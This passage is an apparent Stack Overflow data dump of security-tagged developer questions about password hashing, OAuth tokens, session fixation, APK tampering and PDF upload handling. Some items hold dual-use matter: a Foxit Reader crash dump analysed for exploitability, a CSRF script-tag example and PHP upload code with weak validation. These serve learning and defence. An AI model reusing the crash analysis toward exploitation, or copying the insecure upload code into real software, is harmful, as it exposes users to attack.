entity.\n}\n</code></pre>\n\n<p>So users can still use their emoticons :&lt; and such, and the function only gets triggered if a combination of &lt; and > is found. So no expensive regular expressions and such, just disable &lt; and > in combination and we should be fine.</p>\n"},{"tags":["security","hash","passwords","bcrypt"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":366,"score":3,"question_id":7453236,"title":"How does bcrypt keep up with Moore's law?","body":"<p>I have been seeing recommendations to use bcrypt to hash passwords because of its ability to keep up with Moore's Law.</p>\n\n<p>Apparently the reason for this is because it would take much longer for an attacker to crack a bcrypt hash than a hash generated by a general purpose hash function like SHA256.</p>\n\n<p>How is that possible? How can an algorithm be deliberately slow in spite of Moore's law?</p>\n"},{"tags":["java","security","java-ee","servlets"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":60,"score":0,"question_id":12801134,"title":"Authentication/authorization with jee6 + oAuth or OpenID","body":"<p>I''m trying to write a toy app that uses google or facebook authentication. I don't really know how to set up my jee web application to work with that. Should I use programmatic authentication to do that? The \"login\" method in servlet 3.0 takes user and password and I don't have it actually in this model.</p>\n\n<p>I can't make up how to do that if I don't use standard form-based logins etc, but get redirection instead.</p>\n\n<p>DO you have any sample jee6 project that use similar authentication model?</p>\n"},{"tags":["android","security","oauth","twitter-oauth","facebook-oauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12800887,"title":"renew oAuth tokens on Android without opening a webview","body":"<p>I'm building an app that will integrate with facebook, twitter, instagram, g+, youtube.\nThe google services is simple as I can ask for a token to the AccountManager (or even simpler the GoogleAccountManager) and ask for a token via <code>AccountManager.get(this).getAuthTokenByFeatures(...)</code> if it's the first time, it will prompt the user to authorise and all further access the AccountManager will deal with any token renew, etc and just give me back the token.</p>\n\n<p>But for WebView based authentications (facebook, twitter, instagram) I'm doing the commonly popular method of opening a webview, let the user authorise it, use localhost as the redirect_url and use a WebViewClient to intercept the call, capture the token, and finish the webview.</p>\n\n<p>Up to this point everything is working fine!</p>\n\n<p>The problem I'm facing is that tokens expire! That way after a token expires there will be another popup of the webview, the service will load, hopefully immediately authorise (because the service remembers that the user already authorised it), redirect to localhost and the WebViewClient intercept and close it.</p>\n\n<p>So now imagine the user coming back to an app after a week or so without using it and see several little quick pop up in a row? Terrible user experience to say the least.</p>\n\n<p>Any ideas on how to handle that ????</p>\n"},{"tags":["windows","security","debugging","windbg","fuzzing"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":67,"score":1,"question_id":12800243,"title":"Need help on analyzing a crash for security issues","body":"<p>I was fuzzing an user-mode application, it crashed and of course it is repeatable.</p>\n\n<blockquote>\n  <p>00998b8f ff7604          push    dword ptr [esi+4]    ds:002b:00000004=????????</p>\n</blockquote>\n\n<p>therefore I need to know is this crash causing any security issue or not, The exploitable extention rated this crash as unknown, but !exploitable is not always right.</p>\n\n<blockquote>\n  <p>Exploitability Classification: UNKNOWN\n  Recommended Bug Title: Data from Faulting Address is used as one or more arguments in a subsequent Function Call starting at FoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x0000000000100e2f (Hash=0x0f513521.0x7665441e)</p>\n</blockquote>\n\n<p>The data from the faulting address is later used as one or more of the arguments to a function call.</p>\n\n<p>I also uploaded a mini dump of the app if you are intersted.\n<a href=\"http://upit.ir/do.php?filename=8ba7bd96491.rar\" rel=\"nofollow\">http://upit.ir/do.php?filename=8ba7bd96491.rar</a>\nI think it might be Null pointer dereference, I'm not so sure about it.</p>\n\n<p>here is a quick look of registers :</p>\n\n<pre><code>eax=00f0f0f0 ebx=00732f40 ecx=00000000 edx=0018de78 esi=00000000 edi=0f468a7c\neip=00998b8f esp=0018de64 ebp=0018defc iopl=0         nv up ei ng nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283\nFoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x100e2f:\n00998b8f ff7604          push    dword ptr [esi+4]    ds:002b:00000004=????????\n</code></pre>\n\n<p>and also disassembly of funtion :</p>\n\n<pre><code>00998b8f ff7604          push    dword ptr [esi+4]\n00998b92 ff15a4c1a000    call    dword ptr \n[FoxitReader_Lib_Public!FX_ReleaseBookmarkPanel+0x174444 (00a0c1a4)]\n00998b98 33c0            xor     eax,eax\n00998b9a 50              push    eax\n00998b9b 50              push    eax\n00998b9c 50              push    eax\n00998b9d ff742414        push    dword ptr [esp+14h]\n00998ba1 6a02            push    2\n</code></pre>\n"},{"tags":[".net","security","encryption","connection-string"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":320,"score":0,"question_id":5103670,"title":"Sharing an encrypted connection string across multiple applications in .NET","body":"<p>I'm looking for a way of encrypting a database connection string that will be shared across a number of different services and applications. These applications and services will run on the same machine, but this may (most likely) change in the future.</p>\n\n<p>I've taken a look at the functionality in .NET's System.Configuration namespace, and it doesn't quite do what I want. Unless I'm missing something very obvious, it allows me to encrypt the connection string but there doesn't appear to be a way to export the encryption keys so that I can share them across multiple machines. In fact, it isn't clear from the MSDN documentation whether I'll be able to share this encrypted data across multiple processes. It's probably worth noting here that this is not a ASP.NET web service, so I can't make use of the web.config file and aspnet_regiis.exe to perform key management. Or can I? </p>\n\n<p>If there is no way of doing with with the System.Configuration classes, I'll most likely resort to storing the encrypted connection string in the registry and do my own key management. The ideal solution would be to avoid the registry and use .NET's System.Configuration facility. </p>\n"},{"tags":["c","linux","security","permissions"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12788754,"title":"How to restrict write access to a Linux directory by process attributes?","body":"<p>We've got a situation where it would be advantageous to limit write access to a logging directory to a specific subset of user processes. These particular processes (say, for example, telnet and the like) have been modified by us to generate a logging record whenever a significant user action takes place (like a remote connection, etc). What we do not want is for the user to manually create these records by copying and editing existing logging records.</p>\n\n<p><code>syslog</code> comes close but still allows the user to generate spurious records, <code>SELinux</code> seems plausible but has a terrible reputation of being an unmanageable beast.</p>\n\n<p>Any insight is appreciated.</p>\n"},{"tags":["java","security"],"answer_count":8,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2045,"score":2,"question_id":3893644,"title":"Why is Java labeled as a \"secure\" language?","body":"<p>I guess this is a general question, but I am going through introductory courses to java (SE/ME) and the study material claims that java is often used for \"security purposes\". It does not explain however what they mean by claiming that java incorporates good security. </p>\n\n<p>Is it hacker proof? Does it produce highly stable software? What? </p>\n\n<p>Security from my point of view (at the moment) is that it's in the hands of the developer writing the code, not the language itself?</p>\n"},{"tags":["iphone","objective-c","security","rsa","pem"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12794592,"title":"How to extract exponent and Modulus in .pem","body":"<p>I have a Private.pem file i need to extract the private exponent and Private modulus .Is their any method to do so </p>\n"},{"tags":["java","security","axis2","windows-authentication","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2651,"score":0,"question_id":5905390,"title":"Java client call to Windows Integated Authentication web service","body":"<p>I am writing a Java 1.5+ client that needs to fetch data from an IIS-hosted web service.  I created a new web service client in Eclipse and used the Java Proxy client type and Apache Axis2 web service runtime when generating the client proxy.  The web service itself runs on Windows 2003 and security is set to use only Windows Integrated Authentication.  I have found many articles online that show how to connect successfully from a Java client to this IIS service, but everything I have seen seems to require that I put the username and password in my Java client code somewhere.</p>\n\n<p>My Java client will run on a Windows machine that is on the same Active Directory network that the IIS service is on (i.e. the account I log in with each day can access the service).  I want my Java client to run in the context of the logged-in user without me needing to put in my login credentials in the code.  Here is my current code, which works, yet requires me to put a user name and password in the code:</p>\n\n<pre><code>final NTCredentials nt = new NTCredentials(\"my_username\", \"my_password\", \"\", \"my_domain\");\n        final CredentialsProvider myCredentialsProvider = new CredentialsProvider() {\n            public Credentials getCredentials(final AuthScheme scheme, final String host, int port, boolean proxy) throws CredentialsNotAvailableException {\n                return nt; \n            }\n        };\n\n        DefaultHttpParams.getDefaultParams().setParameter(\"http.authentication.credential-provider\", myCredentialsProvider);\n</code></pre>\n\n<p>But I really don't want to have to put the username and password in the code--I want it to run using the credentials of the logged-in Windows user that is running the Java client.</p>\n\n<p>What code should I use so it will connect with the logged-in user's credentials without needing to specify the user name and password?  Is this possible?</p>\n"},{"tags":["jquery","security","jquery-ajax","token"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12794534,"title":"Overload jQuery.ajax() method to add aditional token value to data parameter","body":"<p>I have to pass an aditional token value to the website so that I can validate the request.</p>\n\n<p>The function that adds the value is this: </p>\n\n<pre><code>AddPageTokenToAjaxRequest = function (data)\n{\n    data.hfPageToken = $('#hfPageToken').val();\n    return data;\n};\n</code></pre>\n\n<p>, and it would have to be used like this: </p>\n\n<pre><code>function asociate(id)\n{\n\n\n    $.ajax({\n        url: postbackURL, \n        type: 'POST',\n        data: AddPageTokenToAjaxRequest( { id: id} ),\n        success: function (result)\n        {\n            refresh();\n        }\n    });\n}\n</code></pre>\n\n<p>The thing is that I do not want to change the code in about 100 of these calls.\nIs there a way to override the data sending ajax call so that I do not have to make 100 changes ?</p>\n"},{"tags":["android","security","rooted-device"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":12793914,"title":"Android : What is the advantage of blocking an application getting installed in a rooted phone?","body":"<p>Is blocking an application from getting installed in a rooted phone, ensures data security?</p>\n\n<p>or</p>\n\n<p>Making an application getting installed in a rooted phone will put the data used by an application, vulnerable to foreign access.</p>\n\n<p>I'm not an Android expert. But I read in articles, unless the data used by an application is made available, other applications can not use it.</p>\n\n<p>I would like to have some clarification in it.</p>\n\n<p>Is it worth blocking an app on a rooted device for a concrete cause??</p>\n"},{"tags":["android","security","mobile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12794122,"title":"How can I block an Android application to access location information through an Android application?","body":"<p>For example I want the user to be able to grant and deny access based on time/date/. To be able to specify the period e.g. 2 hours.</p>\n\n<p>Other restriction that the user can use is: e.g. If I'm on 3G, this X\napplication should not be able to access my location.</p>\n\n<p>If I'm on a Wi-Fi called work. This why application is able to access my location.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["php","security","shared-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12786774,"title":"Password Security for Shared Hosts (PHP 5.2+)","body":"<p>I'm working on some PHP meant to be deployed to users' servers - likely cheap/shared hosting (meaning lowest-common-denominator <strong>PHP 5.2, no modification of PHP installation</strong>). <a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords\">Common advice</a> for password hashes seems to be bcrypt or scrypt, via installable extensions for PHP 5.2.</p>\n\n<p>I've been thinking about using an iterated SHA-512 with a beefy per-user salt, but it doesn't sound like it really compares to bcrypt/scrypt.</p>\n\n<p><strong>Without the ability to modify the base PHP installation</strong>, what options do I have for strong password security?</p>\n"},{"tags":["oracle","security","plsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":192,"score":2,"question_id":7598446,"title":"Can only one procedure within a PL/SQL package be run with AUTHID CURRENT_USER?","body":"<p>I have a PL/SQL package that does <em>not</em> specify an <code>AUTHID</code> (effectively making it <code>AUTHID DEFINER</code>). However, there is precisely one procedure within this package that needs to run as <code>AUTHID CURRENT_USER</code>. Is this possible, or must I create a separate, top-level procedure?</p>\n"},{"tags":["c#","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":306,"score":1,"question_id":2447735,"title":"Can someone explain C# CngKey.Create please?","body":"<p>The internet resources seem few and far between and the best MSDN page (as far as I could tell) throws an error!</p>\n\n<p>Specifically, I'm not sure what to create as a CngKeyCreationParameters object...</p>\n"},{"tags":["security","iis","email","smtp"],"answer_count":3,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":19388,"score":6,"question_id":239262,"title":"Can I configure SMTP in IIS, so it relays to a remote SMTP server?","body":"<p>I want to configure SMTP on my web server, so that any email sent through the SMTP server is relayed to a remote SMTP Server. The IIS SMTP server would have to use SMTP authentication, and use the host name, username and password (as if configuring a normal email client).</p>\n\n<p>Does anybody know if this is possible?</p>\n"},{"tags":["security","liferay-6","jsessionid"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":12775722,"title":"Creating a new JSESSIONID after authentication","body":"<p>When a user hits login page of a <code>Portal</code> (it could be <code>Liferay</code>, <code>Jboss Portal</code>..),  <code>JSESSIONID  cookie</code>is created by the <code>container</code>. After entering credentials in the login page, same <code>JSESSIONID</code> gets carried over. </p>\n\n<p>Here, end user will come to know the <code>JSESSIONID</code>before he could get authenticated (by checking the <code>JSESSIONID</code> in the login page). This will increase vulnerability of the site for hacking because one can know the <code>JSESSIONID</code>  before one gets authenticated. </p>\n\n<p>This <a href=\"http://stackoverflow.com/questions/4722151/what-is-the-vulnerability-of-having-jsessionid-on-first-request-only\">post</a> advices to have a different <code>JSESSIONID</code> after authentication. </p>\n\n<p>So, creating a new JSESSIOND can be achieved by <code>Portal</code> server being used (am using <code>Liferay CE 6.0</code>) or it has to be handled by web application developer? If it has to be handled by web application developer what is the best way to do?  <code>request.getSession(true)</code> is the only option?? If I need to instruct <code>Liferay</code> to create a new <code>JSESSIONID</code> after authentication how it can be done?</p>\n"},{"tags":["ruby-on-rails","security","web-security","hmac"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12789389,"title":"HMAC URLs instead of login?","body":"<p>In implementing my site (a Rails site if it makes any difference), one of my design priorities is to relieve the user of the need to create yet another username and password while still providing useful per-user functionality.</p>\n\n<p>The way I am planning to do this is:</p>\n\n<ol>\n<li>User enters information on the site. Information is associated with the user via server-side session.</li>\n<li>User completes entering information, server sends an access URL via e-mail to the user roughly in the form of: <code>http://siteurl/&lt;user identifier&gt;/&lt;signature: HMAC(secret + salt + user identifier)&gt;</code></li>\n<li>User clicks URL, site looks up user ID and salt and computes the HMAC with the server-stored secret and authenticates if the computed HMAC and signature match.</li>\n</ol>\n\n<p>My question is: is this a reasonably secure way to accomplish what I'm looking to do? Are there common attacks that would render it useless? Is there a compelling reason to abandon my desire to avoid a username/password? Is there a must-read book or article on the subject?</p>\n\n<p>Note that I'm not dealing with credit card numbers or anything exceedingly private, but I would still like to keep the information reasonably secure.</p>\n"},{"tags":["security","password-encryption"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":744,"score":2,"question_id":1225528,"title":"Double hashing security","body":"<p>My first question is, I've heard that hashing the string 2 times (e.g. sha1(sha1(password)) ), because the second hash has a fixed length, is it true??</p>\n\n<p>My the second question is, which is safer? (var1 and var2 are 2 strings):</p>\n\n<ol>\n<li>sha1(var1 + sha1(var2))</li>\n<li>sha1(var1 + var2)</li>\n</ol>\n\n<p>If it is the 1st one, is it worth the performance cost?</p>\n"},{"tags":["php","security","patch","php-5.2"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":403,"score":2,"question_id":6642369,"title":"Does PHP 5.2 still receive security patches?","body":"<p>My server admin tells me PHP 5.2 has been EOLed and so receives no bug fixes. This is obviously the case. He also tells me that 5.2 receives no security patches, which suggests we should upgrade to 5.3 ASAP.</p>\n\n<p>However, a programmer I respect tells me that while PHP 5.2 has been EOLed for bug fixes, it is still very much supported insofar as security exploits are concerned - at least till 2012.</p>\n\n<p>I've searched stackoverflow and google high and low but have come up with no answers to this elementary question.</p>\n\n<p>Anyone care to inform my ignorance?</p>\n"},{"tags":["c#","asp.net",".net","security","owasp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":60,"score":-6,"question_id":12786845,"title":"Solution for Owasp Hacme bank Lessons","body":"<p>I am looking for the solutions to security defects in hacme bank. hacme bank is a asp.net web application which contains some owasp security defects. I want to know how can i improve the aaplication to remove these defects. Are there answers available for hacme back lessons.</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":62,"score":-2,"question_id":12786215,"title":"Set Apk password to preserving privacy","body":"<p>I create an app , i wonder if i can set an password to my Apk just in decompiling ,so  when anyone  try to decompile the application , it will ask for the password , so that will prevent my apk from hacking and preserving my privacy .</p>\n\n<p>any advice will be appreciated , thanks alot .</p>\n"},{"tags":["python","security","encryption","oauth"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":268,"score":3,"question_id":7629288,"title":"Securely store Oauth token(s) in file","body":"<p>I'm developing a small webapp in python that'll interact with a users dropbox account. What is the best way to store the Oauth tokens for that account in a flat file? </p>\n\n<p>Is hashing the tokens secure enough? Or should I encrypt them? If encrypting them is the way to go, how would you suggest storing the key, since 2 way encryption would be necessary to decrypt the tokens for sending to Dropbox?</p>\n\n<p><strike>I could load up sqlite and store the tokens in there, but I'm wondering if there's a good way to do it using flat files.</strike> Same issue is run into with Sqlite, since its also a file. Of course, the file permissions would only be set to the least permissible privilege to be accessed by the webapp.</p>\n"},{"tags":["javascript","asp.net","web-services","security","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12727187,"title":"Security issue with  WebService [Get] Requests?","body":"<p><em>After reading the famous (and only) <a href=\"http://weblogs.asp.net/scottgu/archive/2007/04/04/json-hijacking-and-how-asp-net-ajax-1-0-mitigates-these-attacks.aspx\" rel=\"nofollow\">article</a> about trying to explain why <code>asmxs</code> should NOTallow Get requests\nso we shouldn't use : <code>[ScriptMethod(UseHttpGet = true)]</code> , I still I have a question :</em></p>\n\n<p>Why ?</p>\n\n<p>Web service  , as its name is a service  , he doesn't suppose to care if it's GET or POST : </p>\n\n<p>Even if a person do a CSRF : like  embedding in his malicious site : </p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"http://contoso.com/StockService/Stock.asmx/GetQuotes?symbol=msft\" /&gt; \n</code></pre>\n\n<p>so what ?</p>\n\n<p>Via asmx POV - it is just a normal request.</p>\n\n<p>Can someone please spot for me the problem with example ?</p>\n\n<h2>edit</h2>\n\n<p>there are many problems solved with new browsers.\nthis <a href=\"http://www.thespanner.co.uk/2011/05/30/json-hijacking/\" rel=\"nofollow\">link</a> shows some other methods which should be tested in new browsers.</p>\n"},{"tags":["android","security","checksum"],"answer_count":2,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12785001,"title":"Verify Android apk has not been repackaged?","body":"<p>Looking to improved the security of my Android app to flag if the .apk has been extracted, modified, repacked and resigned. Here's article from Zdnet noting the issue <a href=\"http://www.zdnet.com/android-malwares-dirty-secret-repackaging-of-legit-apps-7000000886/\" rel=\"nofollow\">link1</a>. </p>\n\n<p>The concern is if the app is targeted by hackers they could add malicious code and upload to an alternate app store and dupe users in to downloading it. </p>\n\n<p>So I'm thinking code to verify a checksum of the apk or signing certificate?</p>\n\n<p>I appreciate the app code could be repacked and any security code removed, but it does increase the difficulty of repacking it, maybe enough for them to try another app.</p>\n\n<p>[update]I know the Google Play store licensing module offers something similar but I'm looking for something for non paid apps and other/non marketplaces. </p>\n"},{"tags":["asp.net","security","hmac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12784775,"title":"I Still don't get HMAC or how Signing a request works","body":"<p>I work on ASP.NET and was just reading this from the amazon directory <a href=\"http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html\" rel=\"nofollow\">http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html</a> where it states</p>\n\n<blockquote>\n  <p>Informally, we call this process \"signing the request,\" and we call\n  the output of the HMAC algorithm the \"signature\" because it simulates\n  the security properties of a real signature. Finally, you add this\n  signature as a parameter of the request, using the syntax described in\n  this section.</p>\n  \n  <p>When the system receives an authenticated request, it fetches the AWS\n  Secret Access Key that you claim to have, and uses it in the same way\n  to compute a \"signature\" for the message it received. It then compares\n  the signature it calculated against the signature presented by the\n  requester.</p>\n</blockquote>\n\n<p>But i presume both the requests wont be same right. Request is signed (great!!) but HMAC of the response from the client browser is going to be different since it contains extra data Right? so how come requests can validate even though they are valid</p>\n"},{"tags":["c#",".net","security","project","token"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":65,"score":-2,"question_id":12784330,"title":"Any free library to generate tokens","body":"<p>Tokens can be used for many purposes in a web application some of them below</p>\n\n<ol>\n<li>Generate short verification code for signup's</li>\n<li>Verification code for mobile authentication    </li>\n<li>Avoid CSRF through use of request mapped token    </li>\n<li>Email link validation and many many more</li>\n</ol>\n\n<p>I am on the lookout for one that will do this for me. A token is a short alphanumeric string that is unique, random and configurable. Does anyone know one for .NET, C#</p>\n"},{"tags":["security","encryption","embedded"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12783308,"title":"Why do so many embedded devices use shared keys?","body":"<p>I know this is not strictly a programming question, but I believe it is constructive and relevant to embedded development.</p>\n\n<p>Many commercially available embedded device manufactures use the same keys for all instances of their respective devices. This situation is so rampant, a project called <a href=\"https://code.google.com/p/littleblackbox/\" rel=\"nofollow\">littleblackbox</a> has created a catalog of these keys. From their site:</p>\n\n<blockquote>\n  <p>A command line utility is included to aid in the identification of\n  devices or network traffic that use these known private keys. Given a\n  public certificate, the utility will search the database to see if it\n  has a corresponding private key; if so, the private key is displayed\n  and can be used for traffic decryption or MITM attacks.</p>\n</blockquote>\n\n<p>Having a connection that has been \"secured\" by a publicly known private key provides the user with a false sense of security (especially if CA signed certificates are used), potentially making the device manufacturer liable (in my non-attorney opinion). So why do they do it? Is there some odd benefit I'm missing? The obvious solution to me would be to generate a self-signed certificate on the device's first boot.   </p>\n"},{"tags":["php","javascript","html","ajax","security"],"answer_count":1,"favorite_count":5,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12783695,"title":"Copy Security for HTML site","body":"<p>I just finished my first Site Template on ThemeForest. <br />\nNow i searched for some tips to shared it to get the most purchased. Then i found some programmes which allow you to copy a full site from a web, e.g <a href=\"http://www.httrack.com/\" rel=\"nofollow\">HTTrack</a> <br />\n<br />\nNow my question is: how can i <strong>prevent a copy request</strong> by a program like HTTrack? <br />\nMaybe i can manipulate something in my Demo-Files to confuse the program... <br />\n<br />\nI found nothing in the web... </p>\n"},{"tags":["security","authentication","erlang","couchdb","sasl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12781942,"title":"Erlang SASL AUTH PROTOCOL implementation","body":"<p>Many Systems are beginning to use this <a href=\"http://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer\" rel=\"nofollow\">SASLAuthProtocol</a> (see <a href=\"http://tools.ietf.org/html/rfc4422\" rel=\"nofollow\">RFC4422</a>) for authenticating Clients in RESTFUL interactions. Examples are: Couchbase Server 2.0, Memcached e.t.c. I wonder if there is an erlang complete implementation of this authentication protocol. A <a href=\"http://docs.oracle.com/javase/6/docs/technotes/guides/security/sasl/sasl-refguide.html\" rel=\"nofollow\">Java implementation</a> is a good example of what i am looking for. This <a href=\"https://github.com/membase/ep-engine/blob/master/management/mc_bin_client.py\" rel=\"nofollow\">Python Code</a> seems to be the python implementation of this protocol. Is there an Erlang library i can quickly use to have SASLAuth support in my Application ? </p>\n"},{"tags":["php","security","pdf","upload","file-rename"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12782980,"title":"PDF Uploader script","body":"<p>I have spent 3 days reading and doing tutorials about PHP upload scripts for uploading PDF files to a website, renaming and moving the files.  I can't seem to find a consistent answer on how to format the script. From my reading I see the following as important to this process.  I have not found a good working answer to the PDF upload issue.  </p>\n\n<ol>\n<li>It is important to validate the PDF files with a server side mime verification.  </li>\n<li>Clamscan is important to keep the site clean. Should this be done immediately after upload?</li>\n<li>Files should not be accessible until they are verified by type and virus free.  My understanding is that this is best done by the \"rename\" function of PHP that will allow a move and rename.  </li>\n<li><p>I had considered uploading PDFs into my MySql database, but after reading much of the online advice, I now feel that this may not be the best for my site.  </p></li>\n<li><p>I will be having clients upload pdfs via a html form.  </p></li>\n</ol>\n\n<p>Here is the form I was using:</p>\n\n<pre><code>    &lt;form action =\"PHP UPLOAD.php\" method=\"post\" encrypte=\"multipart/form-data\"&gt;\n    File: &lt;input type=\"file\" name=\"file\" size=\"30\"&gt; &lt;input type=\"submit\" value=\"upload!\"&gt;\n    &lt;/form&gt;\n</code></pre>\n\n<p>This is the PHP I started with from an online tutorial.</p>\n\n<pre><code>&lt;?php\n\n$uploaddir = \"cover\";\n$allowed_ext = \"pdf\";\n$max_size = \"5000000\";\n//$max_height = \"\";\n//$max_width = \"\";\n\n$extension = pathinfo($_FILES['file'] ['name']);\n$extension = $extension[extension];\n$allowed_paths = explode(\", \", $allowed_ext);\nfor($i = 0; $i &lt; count($allowed_paths); $i++) {\nif ($allowed_paths [$i] == \"$extension\") {\n    $ok = \"1\";\n}\n}\n\n\nif ($ok == \"1\")  {\n    if($_FILES['file']['size'] &gt; $max_size)\n    {\n        print \"File is too big!\";\n        exit;\n    }\n\n// Include for images\n//if ($max_width &amp;&amp; $max_height) {\n//list ($width, $height, $type, $w) =\n//getimagesize($_FILES['file']['tmp_name']);\n//if ($width . $max_width || $height &gt; $max_height)\n//{\n//print \"File height and/or width are too big!\";\n//exit;\n//}\n//}\n\nif(is_uploaded_file($_FILES['file']['tmp_name']))\n{\nmove_uploaded_file($_FILES['file']['tmp_name'],$uploaddir.'/'.$_FILES['file']['name']);\n}\nprint \"Your Cover Letter has been successfully uploaded!\";\n} else {\nprint \"Incorrect file extension!\";\n}\n\n?&gt;\n</code></pre>\n\n<p>It returned an Invalid File Type message to me.  </p>\n\n<p>I found this code and it seems to be a better verification via Mime Type, but appears to be not complete.</p>\n\n<pre><code>$allowedExts = array(\n  \"pdf\", \n  \"doc\", \n  \"docx\"\n); \n\n$allowedMimeTypes = array( \n  'application/msword',\n  'text/pdf',\n  'image/gif',\n  'image/jpeg',\n  'image/png'\n);\n\n$extension = end(explode(\".\", $_FILES[\"file\"][\"name\"]));\n\nif ( 20000 &lt; $_FILES[\"file\"][\"size\"]  ) {\n  die( 'Please provide a smaller file [E/1].' );\n}\n\nif ( ! ( in_array($extension, $allowedExts ) ) ) {\n  die( 'Please provide another file type [E/2]. );\n}\n\nif ( in_array( $_FILES[\"file\"][\"type\"], $allowedMimeTypes ) ) \n{      \n move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); \n}\nelse\n{\ndie( 'Please provide another file type [E/3]. );\n}\n</code></pre>\n\n<p>I am trying to learn, but I don't seem to be able to find a very clear path that solves my issues. Can someone give me some clear answers as to what is special about PDF uploads and this process?</p>\n\n<p>For Background, I am building this on my MAC using MAMP and Dreamweaver &amp; Text Wrangler.  I will be implementing this to a GoDAddy site. So, if you know issues that I will be facing I would appreciate a heads up. </p>\n\n<p>Thanks in Advance!</p>\n"},{"tags":["security","multiple","cheat","anti-cheat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":37,"score":-2,"question_id":12781827,"title":"How to identify visitors are unique?","body":"<p>i trying make an internet voting service but the problem is internet is just so easy to cheat by creating multiple accounts and vote same thing. capcha and email is not helping as take just 3 second to pass by human. IP can be changed by proxy. if we put some cookie on voter browser he just clean it next time.</p>\n\n<p>i created this question to ask help for methods we can use with basic futures that all browsers have (javascript etc)to prevent our service being cheated easily.</p>\n\n<p>the first idea i have myself is that possible my website access all cookies user have on his browser by just visiting my site ? because when they clean everything by CCleaner for new accounts then i can understand the browser is empty so the person is perhaps a cheater as most of real users when come to my site always have at least several cookie from different sites</p>\n"},{"tags":["facebook","security","facebook-graph-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12781678,"title":"How to know with which facebook account a client app is connected, without sharing the access token","body":"<p>I don't know whether what I want is possible at all; it does seem like a I have a plausible use case though.</p>\n\n<p>I have an (untrusted) client side app A, which did a <a href=\"https://developers.facebook.com/docs/authentication/client-side/\" rel=\"nofollow\">facebook connect through javascript</a>, say to Sam's account. This app talks to another (untrusted) client side app B (app B runs on another user's computer and is facebook connected to another facebook account, Paul's). App A needs to tell app B that it acts on behalf of Sam, how can it do this in a secure way?</p>\n\n<ul>\n<li>Obviously if A just sends \"Hi, I'm Sam\", app B doesn't know whether app A is lying or not</li>\n<li>App A might send its facebook access token, and app B can call <a href=\"https://graph.facebook.com/me\" rel=\"nofollow\">https://graph.facebook.com/me</a> with that token, and know for sure that A isn't lying. However, now B has A's access token, and can make all sort of facebook calls on Sam's behalf. Definitely not what we want</li>\n<li>I would like to avoid having to build some trusted server, where for instance A sends its access token, and B then gets a trusted reply of who A is</li>\n<li>I guess in theory B could ask A to post something to facebook, and then check for this content, but this has all sorts of side effects that don't seem desirable</li>\n</ul>\n\n<p>I'm just wondering whether there is anything out there that could solve this. In theory, B could send A a challenge, A uses its token to sign it, send it back, and B checks the signature with facebook (if this were possible); or B sends a challenge, A uses its access token to have facebook sign the challenge (again, if possible), send the result back to B. Or perhaps there is another obvious solution that I don't 